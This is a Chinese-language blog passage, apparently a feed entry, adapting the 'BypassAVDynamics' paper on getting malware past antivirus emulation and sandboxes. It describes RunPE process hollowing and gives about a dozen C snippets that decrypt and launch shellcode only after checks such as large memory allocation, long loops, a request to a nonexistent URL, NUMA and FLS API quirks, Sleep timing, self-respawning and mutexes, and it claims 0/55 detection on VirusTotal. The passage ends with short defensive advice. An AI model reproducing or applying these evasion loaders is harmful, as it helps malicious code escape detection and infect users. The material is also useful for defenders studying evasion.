https://blog.sevagas.com/?PE-injection-explained</p><p>虽然代码注入是一个恶意软件隐形的好办法，大量其中的代码也是可能通过启发式分析识别的</p><p>这就是为什么代码注入一般不用于绕过AV，而是使用后用来隐藏和获取特权（例如注入进浏览器的代码和浏览器一样有相同的访问防火墙的权限。</p><h2 id="runpe方法">RunPE方法</h2><p>这个方法是通过替换掉进程空间的代码从而在目标进程中运行我们想要运行的代码，和代码注入不同的是，在代码注入中你是在远程进程开辟的空间中执行代码；但是在RunPE这个技术中，你使用你想要执行的代码替换掉了远程进程的代码。</p><p>一个小例子：</p><p>恶意代码被加壳或者加密了，被插入到一个专门加载它的二进制代码中。当加载器执行，它将执行：</p><ul><li>使用CreateProcess打开一个合法的系统进程（例如：cmd.exe或者calc.exe）。</li><li>取消映射（Unmap）进程（使用NtUnmapViewOfSection）</li><li>使用恶意代码替换掉这个进程（使用WriteProcessMemory）</li></ul><p>当进程被DEP(数据执行保护)保护的时候，替换一个进程的内存不是很有可能的。</p><p>正如代码注入的方法一样，但是因为这篇文章的主题不是这方面的，所以没有给充分的代码。</p><h1 id="简单有效的方法">简单有效的方法</h1><h2 id="offer-you-have-to-refuse-方法">Offer you have to refuse 方法</h2><p>AV扫描器主要的限制是需要在每个文件上花费大量的时间。在一个常规的系统扫描中，AV必须要分析成百上千的文件。它不能够花费过多的时间和力量在个别的文件上（这就可以在AV上导致一个拒绝服务攻击）。最简单绕过AV的方法是仅仅在代码解密之前，消耗掉AV足够的时间。一个简单的Sleep不能够实现这个技巧，AV模拟器已经适应了这个。无论如何有大量的方法可以实现取得时间。这个被叫做“Offer you have to refuse ”，因为它强行让AV去检查一些代码，这个会消耗掉AV大量的资源，因此我们确信在解密代码被执行之前AV会放弃这个检查。</p><h3 id="例子1分配填充100m内存">例子1：分配填充100M内存</h3><p>在下面的代码中，大部分的AV会在malloc的过程中仅仅停止，关于分配指针的条件验证甚至没有必要。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TOO_MUCH_MEM 100000000</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *memdmp = <span class="literal">NULL</span>;</span><br><span class="line">    memdmp = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(TOO_MUCH_MEM);</span><br><span class="line">    <span class="keyword">if</span> (memdmp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(memdmp, <span class="number">00</span>, TOO_MUCH_MEM);</span><br><span class="line">        <span class="built_in">free</span>(memdmp);</span><br><span class="line">        decryptCodeSection();</span><br><span class="line">        startShellCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当时的VT：0/55</p><h3 id="例子2成百上千的递增">例子2：成百上千的递增</h3><p>使用for循环去每次递增1，达到100万次。这个足以绕过杀软，而且对于现代CPU是可行的。一个人在运行这段代码不会检测到任何的异常。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_OP 100000000</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cpt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_OP; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cpt++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cpt == MAX_OP)</span><br><span class="line">    &#123;</span><br><span class="line">        decryptCodeSection();</span><br><span class="line">        startShellCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="the-i-shouldnt-be-able-to-do-that-method">The “I shouldn’t be able to do that!” method</h2><p>由于在一个仿真的系统里被推出，或许会有一些错误发生，代码或许在正常权限下不会运行。一般来说，在所有权限下，代码都将运行。这个能够被用来猜出这个代码是否在被分析。</p><h3 id="例子1打开系统进程">例子1：打开系统进程</h3><p>代码会尝试打开一般是拥有所有权限的4号系统进程。如果这个代码没有运行在系统MIC和ring0下，这个将会失败（OpenProcess会返回 00 ）。在这个VirusTotal中，你会看到这个不是FUD方法，而是绕过一些对这个特殊问题脆弱的杀软。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE file;</span><br><span class="line">    HANDLE proc;</span><br><span class="line">    proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> (proc == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        decryptCodeSection();</span><br><span class="line">        startShellCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="尝试打开一个不存在的url">尝试打开一个不存在的URL</h3><p>一种通常用来让代码自我意识到沙箱的方法是在互联网上下载一个特定的文件，并将其哈希与代码知道的哈希进行比较。</p><p>为什么这个有效呢？这是因为沙箱环境不给潜在的恶意代码访问互联网的权限。当一个被沙箱分析的文件访问互联网，沙箱只会发送其自身成的文件。因此代码可以通过比较这个文件和其所期望的文件进来判断是否处于沙箱之中。</p><p>这个方法有一点问题，首先，如果你没有互联网的访问权限这个就没有效。其次，如果<a href="https://www.77169.net/downloads">下载</a>的文件改变或者被移除了，代码也不会有效。</p><p>另一个没有这些问题的方法是做这个相反的！尝试访问不存在的web域。在真实的世界里，这个会失败。在AV中，因为AV会使用其模拟的页面，这个方法是有效的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Wininet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Wininet.lib&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cononstart[] = <span class="string">&quot;http://www.notdetectedmaliciouscode.com//&quot;</span>; <span class="comment">// Invalid URL</span></span><br><span class="line">    <span class="keyword">char</span> readbuf[<span class="number">1024</span>];</span><br><span class="line">    HINTERNET httpopen, openurl;</span><br><span class="line">    DWORD read;</span><br><span class="line">    httpopen = InternetOpen(<span class="literal">NULL</span>, INTERNET_OPEN_TYPE_DIRECT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    openurl = InternetOpenUrl(httpopen, cononstart, <span class="literal">NULL</span>, <span class="literal">NULL</span>, INTERNET_FLAG_RELOAD | INTERNET _FLAG_NO_CACHE_WRITE, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!openurl) <span class="comment">// Access failed, we are not in AV</span></span><br><span class="line">    &#123;</span><br><span class="line">        InternetCloseHandle(httpopen);</span><br><span class="line">        InternetCloseHandle(openurl);</span><br><span class="line">        decryptCodeSection();</span><br><span class="line">        startShellCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// Access successful, we are in AV and redirected to a custom webpage</span></span><br><span class="line">    &#123;</span><br><span class="line">        InternetCloseHandle(httpopen);</span><br><span class="line">        InternetCloseHandle(openurl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="the-knowing-your-enemy-method">The “Knowing your enemy” method</h2><p>如果某些人知道了一些目标机器上的一些信息，绕过杀软会变得相当的容易。把代码解密机制链接到你知道目标计算机上的一些信息（或者工作组）。</p><h3 id="例子1依赖于本地用户名的操作">例子1：依赖于本地用户名的操作</h3><p>如果系统上某人的用户名已知，则可以根据该用户名请求操作。例如，我们可以尝试在用户帐户文件中写入和读取这些文件。在下面的代码中，我们在用户桌面上创建一个文件，我们在其中编写一些字符，然后只有打开文件并读取字符，我们才能启动解密方案。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILE_PATH <span class="meta-string">&quot;C:\\Users\\bob\\Desktop\\tmp.file&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE file;</span><br><span class="line">    DWORD tmp;</span><br><span class="line">    LPCVOID buff = <span class="string">&quot;1234&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> outputbuff[<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    file = CreateFile(FILE_PATH, GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS,</span><br><span class="line">                      FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (WriteFile(file, buff, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)buff), &amp;tmp, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(file);</span><br><span class="line">        file = CreateFile(FILE_PATH,</span><br><span class="line">                          GENERIC_READ,</span><br><span class="line">                          FILE_SHARE_READ,</span><br><span class="line">                          <span class="literal">NULL</span>,</span><br><span class="line">                          OPEN_EXISTING, <span class="comment">// existing file only</span></span><br><span class="line">                          FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">                          <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (ReadFile(file, outputbuff, <span class="number">4</span>, &amp;tmp, <span class="literal">NULL</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strncmp</span>(buff, outputbuff, <span class="number">4</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                decryptCodeSection();</span><br><span class="line">                startShellCode();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        CloseHandle(file);</span><br><span class="line">    &#125;</span><br><span class="line">    DeleteFile(FILE_PATH);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="the-wtf-is-that-method">The “WTF is that?” method</h2><p>这节是关于win api的东西</p><h3 id="例子1what-the-fuck-is-numa">例子1：What the fuck is NUMA?</h3><p>NUMA代表Non Uniform Memory Access（非一致内存访问）。它是一个在多系统中配置内存管理的方法。它链接到在 Kernel32.dll 中声明的一整套函数</p><p>更多信息：https://docs.microsoft.com/zh-cn/windows/win32/procthread/numa-support?redirectedfrom=MSDN</p><p>下面的代码在物理环境中有效，av环境中失效</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LPVOID mem = <span class="literal">NULL</span>;</span><br><span class="line">    mem = VirtualAllocExNuma(GetCurrentProcess(), <span class="literal">NULL</span>, <span class="number">1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mem != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        decryptCodeSection();</span><br><span class="line">        startShellCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="例子2what-the-fuck-are-fls">例子2：What the fuck are FLS?</h3><p>FLS是Fiber Local Storage(纤程本地存储），被用来操纵与纤程相关的数据。纤程是一整套运行在线程里的可执行组件。参考这里：https://docs.microsoft.com/zh-cn/windows/win32/procthread/fibers?redirectedfrom=MSDN</p><p>在一些av环境中，对于FlsAlloc函数总是返回FLS_OUT_OF_INDEXES</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD result = FlsAlloc(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (result != FLS_OUT_OF_INDEXES)</span><br><span class="line">    &#123;</span><br><span class="line">        decryptCodeSection();</span><br><span class="line">        startShellCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="the-checking-the-environment-method">The “Checking the environment” method</h2><p>如果AV依赖于一个沙盒/仿真环境，一般其环境与真实的环境是不一样的。有大量的方法做这种检查。下面描述了其中两种方法：</p><h3 id="例子1检查进程内存">例子1：检查进程内存</h3><p>使用Sysinternals工具，当一个AV扫描一个进程的时候，会改变它的内存。AV会为进程开辟内存，仿真的代码进程API也会返回与我们预期不同的值。在这种情况下，我在当前进程使用GetProcessMemoryInfo。如果当前工作设置大于3500000 bytes，我认为这个代码运行在一个AV环境中，如果不是，那么这个代码就解密并运行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Psapi.lib&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PROCESS_MEMORY_COUNTERS pmc;</span><br><span class="line">    <span class="built_in">GetProcessMemoryInfo</span>(<span class="built_in">GetCurrentProcess</span>(), &amp;pmc, <span class="built_in"><span class="keyword">sizeof</span></span>(pmc));</span><br><span class="line">    <span class="keyword">if</span> (pmc.WorkingSetSize &lt;= <span class="number">3500000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">decryptCodeSection</span>();</span><br><span class="line">        <span class="built_in">startShellCode</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="例子2-time-distortion">例子2： Time distortion</h3><p>我们知道Sleep函数是被AV仿真了。做这个是为了阻止使用一个简单的Sleep调用就绕过扫描时间限制。这个问题是，是否在这个模拟的Sleep方式中存在缺陷？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;winmm.lib&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD mesure1;</span><br><span class="line">    DWORD mesure2;</span><br><span class="line">    mesure1 = timeGetTime();</span><br><span class="line">    Sleep(<span class="number">1000</span>);</span><br><span class="line">    mesure2 = timeGetTime();</span><br><span class="line">    <span class="keyword">if</span> ((mesure2 &gt; (mesure1 + <span class="number">1000</span>)) &amp;&amp; (mesure2 &lt; (mesure1 + <span class="number">1005</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        decryptCodeSection();</span><br><span class="line">        startShellCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="例子3what-is-my-name">例子3：What is my name?</h3><p>直接看代码都能懂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(argv[<span class="number">0</span>], <span class="string">&quot;test.exe&quot;</span>) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        decryptCodeSection();</span><br><span class="line">        startShellCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="the-i-call-myself-method">The “I call myself” method</h2><p>这是环境检查方法的一个变体。AV只有在以某种方式调用时才会触发代码</p><h3 id="例子1i-am-my-own-father">例子1：I am my own father</h3><p>在这个例子中，如果它的父进程也是test.exe的话，可执行文件（test.exe）才会进入解密的分支。当代码被安装，它会获取其父进程的ID，如果其父进程不是test.exe，它会调用test.exe然后停止。被调用的进程也有一个叫test.xee的父进程并且进入解密部分。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Psapi.lib&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid = <span class="number">-1</span>;</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    PROCESSENTRY32 pe = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    pe.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">    <span class="comment">// Get current PID</span></span><br><span class="line">    pid = GetCurrentProcessId();</span><br><span class="line">    <span class="keyword">if</span> (Process32First(h, &amp;pe))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// find parent PID</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (pe.th32ProcessID == pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// Now we have the parent ID, check the module name</span></span><br><span class="line">                <span class="comment">// Get a handle to the process.</span></span><br><span class="line">                hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE,</span><br><span class="line">                                       pe.th32ParentProcessID);</span><br><span class="line">                <span class="comment">// Get the process name.</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">NULL</span> != hProcess)</span><br><span class="line">                &#123;</span><br><span class="line">                    HMODULE hMod;</span><br><span class="line">                    DWORD cbNeeded;</span><br><span class="line">                    TCHAR processName[MAX_PATH];</span><br><span class="line">                    <span class="keyword">if</span> (EnumProcessModules(hProcess, &amp;hMod, <span class="keyword">sizeof</span>(hMod), &amp;cbNeeded))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// If parent process is myself, decrypt the code</span></span><br><span class="line">                        GetModuleBaseName(hProcess, hMod, processName,</span><br><span class="line">                                          <span class="keyword">sizeof</span>(processName) / <span class="keyword">sizeof</span>(TCHAR));</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">strncmp</span>(processName, <span class="string">&quot;test.exe&quot;</span>, <span class="built_in">strlen</span>(processName)) == <span class="number">0</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            decryptCodeSection();</span><br><span class="line">                            startShellCode();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="comment">// or else call my binary in a new process</span></span><br><span class="line">                            startExe(<span class="string">&quot;test.exe&quot;</span>);</span><br><span class="line">                            Sleep(<span class="number">100</span>); <span class="comment">// Wait for child</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// Release the handle to the process.</span></span><br><span class="line">                CloseHandle(hProcess);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (Process32Next(h, &amp;pe));</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(h);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="例子2first-open-a-mutex">例子2：First open a mutex</h3><p>在这个例子中，只有当一个确定的互斥量对象已经存在于系统中，代码（test.exe)才会开始解密代码。这个技巧是这样，当这个对象不存在，代码会创建并调用其自己一个新的实例。在父进程结束之前，子进程会尝试创建一个互斥量，会进入这个ERROR_ALREADY_EXIST代码分支。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE mutex;</span><br><span class="line">    mutex = CreateMutex(<span class="literal">NULL</span>, TRUE, <span class="string">&quot;muuuu&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (GetLastError() == ERROR_ALREADY_EXISTS)</span><br><span class="line">    &#123;</span><br><span class="line">        decryptCodeSection();</span><br><span class="line">        startShellCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        startExe(<span class="string">&quot;test.exe&quot;</span>);</span><br><span class="line">        Sleep(<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="结论">结论</h1><p>以上例子说明，若是能够利用杀软的弱点，绕过他们是很容易的。仅仅需要一些关于windows系统的知识和杀软工作的机制。但是，我并不是说杀软是没用的。杀软在检测已经存在于特征数据库种的恶意代码是非常有用的。同时，杀软对于系统恢复也是很有用的。我想说的是，杀软可以容易被新的病毒戏弄，尤其是对于有目的的攻击。</p><p>自定义的恶意软件经常作为APT攻击的一部分，杀软可能对于它们的攻击显的没有用。这并不意味着丢失了一切！对于杀软有选择的方案：加固系统、设置应用程序白名单机制、基于主机的入侵防御系统IPS等。这些解决方案有其长度和短处。</p><p>如果我给一些谦虚的建议来抵抗恶意软件，我想说：</p><ol type="1"><li>没必要的情况下永远不要作为administrator权限去运行程序。这个黄金定律在没有杀软的情况下，能够避免99%的恶意软件。这个已经成为Linux用户做一些操作的正常的方式很多年了。这是我最重要的安全措施建议。</li><li>加固系统，当前版本的windows系统有很强大的安全特性，尽管使用。</li><li>部署NIDS（<a href="https://www.77169.net/qqhack/hkrq-hejs">入侵</a>检测系统）监控你的网络。很多时候，感染恶意软件并不是在受害者机器上被检测到的，而是应该感谢NIDS和防火墙日志。</li><li>使用多个不同厂商的杀软。一个产品的长处可以覆盖另一个短处，也有可能一个国家的杀软对于来自该国家的杀软竟会更加熟</li><li>最后一点，安全意识建设。如果人被利用了，那么杀软基本是没用的。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文译的是《BypassAVDynamics》，也不能算译文，主要写自己读完之后学到的东西&lt;/p&gt;
&lt;p&gt;好久之前的文章了，vt应该查杀挺多的，没测试&lt;/p&gt;
&lt;p&gt;need read：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://bl</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="免杀" scheme="https://ghostasky.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>Powershell</title>
    <link href="https://ghostasky.github.io/2022/05/25/Powershell/"/>
    <id>https://ghostasky.github.io/2022/05/25/Powershell/</id>
    <published>2022-05-24T16:00:00.000Z</published>
    <updated>2022-07-12T06:27:23.837Z</updated>
    
